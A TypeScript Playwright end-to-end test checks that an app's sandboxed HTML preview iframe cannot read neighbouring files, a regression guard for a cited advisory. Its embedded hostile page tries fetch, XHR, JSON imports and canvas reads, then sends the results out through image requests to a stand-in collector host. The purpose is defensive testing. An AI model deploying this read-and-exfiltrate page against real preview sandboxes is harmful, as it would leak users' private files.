/**
 * 预览里的网页是不可信的内容：同目录的脚本、样式、图片照常加载，但页面自己的脚本读不到旁边的文件，
 * 也就没有东西能拼进 https 图片地址送出去（GHSA-7cfg-58gc-h8jx：fetch 同目录的 JSON，再经图片地址外发）。
 * 这里用和面板一样的 iframe（sandbox="allow-scripts allow-forms"）在真实浏览器里跑一个故意去读、去发的页面。
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { createRequire } from "node:module";
import { App } from "../src/app.js";
import { loadConfig } from "../src/config.js";
import { signIn } from "./helpers.js";

const require = createRequire(import.meta.url);
let chromium: any;
try { ({ chromium } = require("playwright")); }
catch { try { ({ chromium } = require(require.resolve("playwright-core", { paths: [path.join(import.meta.dirname, "../site")] }))); } catch { /* Browser QA is optional on minimal CI images. */ } }
const chrome = process.env.AMB_TEST_CHROME || chromium?.executablePath();
const browserAvailable = !!chromium && chrome && fs.existsSync(chrome);

const SECRETS = { json: "SIBLING_JSON_MARKER", deep: "NESTED_JSON_MARKER", html: "SIBLING_HTML_MARKER", svg: "SIBLING_SVG_MARKER" };
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
const COLLECTOR = "https://collector.test";

/** 页面把能想到的读法都试一遍，读到什么就经 https 图片地址发出去，最后把结果报给外层 */
const HOSTILE = `<!doctype html><html><head><meta charset="utf-8"><link rel="stylesheet" href="style.css"><script src="app.js"></script></head><body>
<script type="module">
const out = { classic: String(window.classic) };
const grab = async (name, fn) => { try { out[name] = String(await fn()); } catch (e) { out[name] = "blocked: " + (e && e.name); } };
const xhr = (u) => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", u); x.onload = () => ok(x.responseText); x.onerror = () => no(new Error("xhr")); x.send(); });
const img = (u, cors) => new Promise((ok, no) => { const i = new Image(); if (cors) i.crossOrigin = "anonymous"; i.onload = () => ok(i); i.onerror = () => no(new Error("img")); i.src = u; });
const pixels = async (u, cors) => { const i = await img(u, cors); const c = document.createElement("canvas"); c.width = c.height = 1; c.getContext("2d").drawImage(i, 0, 0); return c.toDataURL(); };
const text = (u, init) => async () => { const r = await fetch(u, init); return r.status + " " + (await r.text()); };
await grab("fetchJson", text("private.json"));
await grab("fetchJsonNoCors", text("private.json", { mode: "no-cors" }));
await grab("xhrJson", () => xhr("private.json"));
await grab("nestedJson", text("sub/deep.json"));
await grab("importJson", async () => JSON.stringify((await import("./private.json", { with: { type: "json" } })).default));
await grab("fetchHtml", text("notes.html"));
await grab("fetchSvg", text("icon.svg"));
await grab("fetchScript", text("app.js"));
await grab("pixelsCors", () => pixels("photo.png", true));
await grab("pixels", () => pixels("photo.png", false));
await grab("module", async () => (await import("./mod.mjs")).value);
await grab("image", async () => (await img("photo.png", false)).naturalWidth);
out.color = getComputedStyle(document.body).color;
const send = (q) => new Promise((done) => { const i = new Image(); i.onload = i.onerror = done; i.src = ${JSON.stringify(COLLECTOR)} + q; });
await send("/pixel.png");
for (const k of Object.keys(out)) await send("/capture?k=" + k + "&d=" + encodeURIComponent(out[k].slice(0, 1500)));
parent.postMessage({ probe: out }, "*");
</script></body></html>`;

describe.skipIf(!browserAvailable)("HTML 预览：页面读不到旁边的文件", () => {
  let app: App, root: string, origin: string, browser: any;

  beforeAll(async () => {
    root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "amb-preview-e2e-")));
    app = new App(loadConfig({ dataDir: root, env: { AMB_MAGPIE_BASE_URL: "http://127.0.0.1:9/v1", AMB_MAGPIE_API_KEY: "k", AMB_UI_PORT: "0", AMB_AGENT: "off", AMB_WEIXIN_API_BASE: "http://127.0.0.1:9" } }), { printQrToTerminal: false });
    await app.start();
    origin = app.web!.url.replace(/\/$/, "");
    const site = path.join(root, "workspaces", "default", "site");
    fs.mkdirSync(path.join(site, "sub"), { recursive: true });
    const put = (name: string, body: string | Buffer) => fs.writeFileSync(path.join(site, name), body);
    put("index.html", HOSTILE);
    put("private.json", JSON.stringify({ marker: SECRETS.json }));
    put("sub/deep.json", JSON.stringify({ marker: SECRETS.deep }));
    put("notes.html", `<p>${SECRETS.html}</p>`);
    put("icon.svg", `<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><title>${SECRETS.svg}</title></svg>`);
    put("photo.png", PNG);
    put("style.css", "body { color: rgb(1, 2, 3); }");
    put("app.js", "window.classic = 'ok';");
    put("mod.mjs", "export const value = 'ok';");
    app.store.ensureConversation("default", "web", "console", "控制台");
    browser = await chromium.launch({ executablePath: chrome, args: ["--no-sandbox"] });
  });
  afterAll(async () => { await browser?.close(); await app?.stop(); fs.rmSync(root, { recursive: true, force: true }); });

  it("同目录的 JSON、网页、图片内容读不到也发不出去；脚本、模块、样式、图片照常加载", async () => {
    const descriptor = (await (await fetch(`${origin}/amb/api/conversations/${encodeURIComponent("default:web:console")}/file/preview?path=${encodeURIComponent("site/index.html")}`)).json()) as any;
    expect(descriptor.kind).toBe("html");
    const context = await browser.newContext();
    const sent: string[] = [];
    await context.route(`${COLLECTOR}/**`, (route: any) => { sent.push(decodeURIComponent(route.request().url())); return route.fulfill({ status: 204 }); });
    const page = await context.newPage();
    // 用户自己的浏览器里有管理界面的令牌 Cookie：带着它，预览页照样读不到、发不出去
    await signIn(page, origin);
    try {
      // 外层页面和控制台同源（frame-ancestors 'self'），iframe 的属性同 ui/screens/resource-preview.js
      await page.goto(`${origin}/amb/file-preview/none`);
      await page.setContent(`<script>addEventListener("message", (e) => { if (e.data && e.data.probe) window.probe = e.data.probe; });</script>
        <iframe src=${JSON.stringify(descriptor.url)} sandbox="allow-scripts allow-forms" referrerpolicy="no-referrer"></iframe>`);
      const probe = (await (await page.waitForFunction(() => (window as any).probe, undefined, { timeout: 15_000 })).jsonValue()) as Record<string, string>;

      // 文档里写明的能力不变：同目录的脚本、模块、样式、图片照常加载，https 图片也照常请求
      expect(probe).toMatchObject({ classic: "ok", module: "ok", color: "rgb(1, 2, 3)", image: "1" });
      expect(sent).toContain(`${COLLECTOR}/pixel.png`);

      // 读不到：每一种读法都失败，页面手里没有旁边文件的内容
      for (const k of ["fetchJson", "xhrJson", "nestedJson", "importJson", "fetchHtml", "fetchSvg", "fetchScript", "pixelsCors", "pixels"]) expect(probe[k], k).toMatch(/^blocked: /);
      const seen = JSON.stringify(probe) + sent.join("\n");
      for (const marker of Object.values(SECRETS)) expect(seen).not.toContain(marker);
      expect(seen).not.toContain("data:image/png");
    } finally { await context.close(); }
  });
});
